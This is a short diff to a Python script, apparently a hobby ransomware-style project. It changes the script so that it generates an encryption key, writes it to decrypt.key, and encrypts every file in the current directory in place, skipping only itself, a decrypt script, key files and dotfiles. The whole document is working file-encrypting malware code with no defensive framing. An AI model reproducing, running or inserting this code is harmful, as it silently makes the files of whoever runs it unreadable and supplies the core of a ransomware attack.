@@ -4,23 +4,22 @@ import os
 '''
 Key Management
 '''
-def create_key():
-    Key = Fernet.generate_key()
-    with open("key.key", "wb") as key_file:
-        key_file.write(Key)
-
-def load_key():
-    return open("key.key", "rb").read()
+key = Fernet.generate_key()
+with open("decrypt.key", "wb") as key_file:
+    key_file.write(key)
 
 '''
 File listing
 '''
 files = []
 for file in os.listdir():
-    if file == "encrypt.py" or file.startswith('.'):
+    if file == "encrypt.py" or file.startswith('.') or file == "decrypt.py" or file.endswith('.key'):
         continue
     files.append(file)
 
-# print(files)
-
-
+for file in files:
+    with open(file, "rb") as target_file:
+        contents = target_file.read()
+    encrypt_contents = Fernet(key).encrypt(contents)
+    with open(file, "wb") as target_file:
+        target_file.write(encrypt_contents)
